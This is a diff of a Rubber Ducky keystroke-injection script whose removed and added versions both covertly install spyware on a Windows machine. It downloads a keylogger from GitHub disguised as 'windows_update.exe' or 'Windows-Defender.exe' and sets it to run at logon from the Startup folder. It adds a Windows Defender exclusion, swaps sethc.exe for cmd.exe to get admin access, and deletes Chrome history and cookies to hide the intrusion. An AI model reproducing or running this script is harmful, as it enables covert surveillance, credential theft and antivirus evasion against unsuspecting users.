@@ -1,189 +1,72 @@
-REM ducky script for downloading a file from github and executing it as a process assuming that the user is an admin 
-REM plus adding a shortcut which will run even if the user shuts down or restarts computer
-
 GUI r
 DELAY 200
-STRING powershell  Start-Process cmd -Verb RunAs
-ENTER
-DELAY 3500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 1500
 ALT y
-DELAY 400
-STRING cd "%USERPROFILE%\Desktop"
-ENTER 
-DELAY 100
-STRING powershell
+DELAY 600
+STRING start 
 ENTER
-DELAY 400
-STRING $wc=New-Object System.Net.Webclient
-ENTER
-DELAY 100
-STRING $wc.DownloadFile("https://github.com/smallmacy/Cyber_Project/raw/master/keylogging.exe","windows_update.exe")
-ENTER
-DELAY 5000
-STRING exit
-ENTER
-DELAY 200
-
-STRING Icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" /grant Everyone:(OI)(CI)F /T
-ENTER
-DELAY 200
-REM This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut 
-
-REM Script for shortcut:
-
-STRING cd "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
-ENTER
-DELAY 150
-STRING start .
-ENTER
-DELAY 500
-MENU w 
-STRING s
 DELAY 300
-STRING C:\Windows\System32\cmd.exe /min /c "set __COMPAT_LAYER=RUNASINVOKER && start "" %USERPROFILE%\Desktop\windows_update.exe"
+STRING  Icacls "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /grant Everyone:(OI)(CI)F /T & MKDIR "%USERPROFILE%\Desktop\system" & cd "%USERPROFILE%\Desktop\system" & attrib +s +h "%USERPROFILE%\Desktop\system" & powershell
+ENTER
+DELAY 400
+REM The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created
+STRING $WshShell = New-Object -comObject WScript.Shell;  $Shortcut = $WshShell.CreateShortcut("$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk");$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"; $Shortcut.Arguments = '/min /c "set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > ""%USERPROFILE%\Desktop\system\connections.txt"" && start "" %USERPROFILE%\Desktop\system\Windows-Defender.exe"'; $Shortcut.Save(); Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\system";$wc=New-Object System.Net.Webclient; $wc.DownloadFile("https://www.github.com/smallmacy/Cyber_Project/raw/master/final.exe", "Windows-Defender.exe");  
 ENTER
 DELAY 100
-STRING test.exe
+REM switch to other cmd tab
+ALT TAB
+DELAY 200
+REM This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut
+STRING cd "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup" 
+ENTER
+DELAY 300
+REM Steps to restore chrome if it was up or just delete the history file if it isn't:
+REM Check if chrome is running by the lines until the if statement:
+STRING FOR /F "tokens=* USEBACKQ" %g IN (`tasklist /FI "STATUS eq RUNNING" /FI "IMAGENAME eq chrome.exe"`) DO (SET condition=%g)
+ENTER
+DELAY 300
+STRING IF NOT "%condition%" == "INFO: No tasks are running which match the specified criteria." (start chrome)
+REM Either open chrome and delete the cookies so webtop user will be logged out, or do nothing if chrome isn't running
+ENTER
+DELAY 2000
+CTRL SHIFT DELETE
+DELAY 800
 ENTER
 DELAY 400
 CTRL w
-
-STRING powershell Start-Process "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk" -WindowStyle Hidden
 ENTER
+DELAY 400
+ALT TAB
+DELAY 300
+REM Deleting the other cmd after removing the exclusion from windows defender
+ENTER
+DELAY 300
+ALT SPACE
+DELAY 100
+STRING c
+DELAY 300
+REM Restart explorer to hide folder
+STRING TSKILL chrome & start test.lnk 
+ENTER 
+DELAY 400
+REM Delete the history file and starting the shortcut
+STRING DEL "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" & DEL "%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\History"
+ENTER
+DELAY 250
+REM Either go to chrome to restore tabs, or open another cmd window. Both ways close all suspicious windows
+STRING IF NOT "%condition%" == "INFO: No tasks are running which match the specified criteria." (start chrome & exit) else (start)
+ENTER
+DELAY 2000
+CTRL SHIFT t
+ENTER
+DELAY 1000
+ALT TAB
 DELAY 300
 STRING exit
 ENTER
-
-
-REM the program is running as a process!
-
-
-
-
-
-
-
-
-
-
-
-REM RUBBER DUCKEY code to access cmd with admin privilages and downloading spyware
-REM should check if the restart method also works with "cmd" instead of "System image recovery"
-REM If suggestion works could save time and many lines of code
-
-REM the only flaw so far is that I have to maually shut down and turn on instead of keyboard
-REM Part 1: getting the cmd with admin privilages o login screen
-REM Before I insert the rubber ducky, I shut down the computer and turn on again, but for 2 times I force shut 
-REM down before the startup window finishes loading, On the third time I will have forced the computer to safe mode.
-REM this is the part navigated in safe mode, where I insert the rubber ducky. 
-TAB
-ENTER
-DELAY 1000
-
-REM go to troubleshoot
-
-TAB
-ENTER
-DELAY 1000
-
-REM choose advanced options
-
-TAB
-ENTER
-DELAY
-
-REM choose Command Prompt - 2 Tabs	
-
-TAB
-TAB
-ENTER
-DELAY 1000
-
-REM In the command Prompt, you need to find file sethc.exe in order to change it to cmd
-REM The rubber ducky will search and try multiple dirves in order to change the file name
-REM first, it will try C:
-
-STRING C:
-ENTER
-DELAY 100
-STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
-ENTER
-DELAY 200
-STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
-ENTER 
-DELAY 200 
-
-REM If not C: then D:
-
-STRING D:
-ENTER
-DELAY 100
-STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
-ENTER
-DELAY 100
-STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
-ENTER 
-DELAY 100
-
-REM If not D: then E:
-
-STRING E:
-ENTER
-DELAY 100
-STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
-ENTER
-DELAY 200
-STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
-ENTER 
-DELAY 200
-
-REM finally it will try F:
-
-STRING F:
-ENTER
-DELAY 100
-STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
-
-DELAY 200
-STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
-ENTER 
-DELAY 200
-
-REM in 99.9999999% of the time it will be enough
-REM Now it will exit cmd and return to screen
-
-REM there you go! cmd with admin access!
-REM Next part is to open powershell, download the malware and copy it to a specific file that will auto run
-REM as soon as the user logs on
-STRING powershell
-ENTER
-DELAY 100
-STRING $wc=New-Object System.Net.Webclient
-ENTER
-DELAY 100
-REM downlaoding file to desktop
-STRING $wc.DownloadFile("https://github.com/smallmacy/Cyber_Project/raw/master/14Oct2018.exe", "Desktop/demo.exe")
-ENTER
 DELAY 400
-STRING $o = "C:/Users/%UserNameOfVictim%/Desktop"
-ENTER
-DELAY 100
-STRING $c = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsService.exe"
-ENTER
-DELAY 100
-STRING Copy-Item $O -destination $c
-ENTER
+ALT SPACE
 DELAY 200
-REM exiting powershell and cmd
-STRING exit
-ENTER
-DELAY 100
-STRING exit
-ENTER
-DELAY 100
-REM There we have it! A full rubber ducky script that inkects an executable file with malicious code
-REM and executes it when the user logs on
-REM Best of all- user won't even know that he was hacked! It's all from login screen
-REM NOTE!!! You will have to restart the computer in order for the directory StartUp will recognize the file 
-REM as part of its automated tasks.
-
+STRING c
